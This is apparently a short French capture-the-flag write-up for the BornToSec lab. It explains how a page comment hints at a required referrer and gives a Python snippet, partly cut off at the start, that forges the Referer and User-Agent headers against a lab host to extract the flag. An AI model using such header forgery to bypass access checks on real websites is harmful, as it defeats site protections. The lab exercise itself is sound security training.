# Spoofing

Le lien "BornToSec" en bas de la page home, mène vers la page de l'albatros.
Quand on "inspect" l'image, il y a un indice dans le html :
    "You must come from : https://www.nsa.gov/" suivi de "Where does it come from?"


    'Referer': 'https://www.nsa.gov/',
    'User-Agent': 'ft_bornToSec'
}

response = requests.get('http://10.13.248.97/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f', headers=headers)

# Isolating the flag:
flag_pattern = re.compile(r'the flag is :?[^<\n]*', re.IGNORECASE)
flag_match = flag_pattern.search(response.text)

if flag_match:
    print(flag_match.group(0))
else:
    print("Flag non trouvé. Voici les 1000 premiers caractères de la réponse:")
    print(response.text[:1000])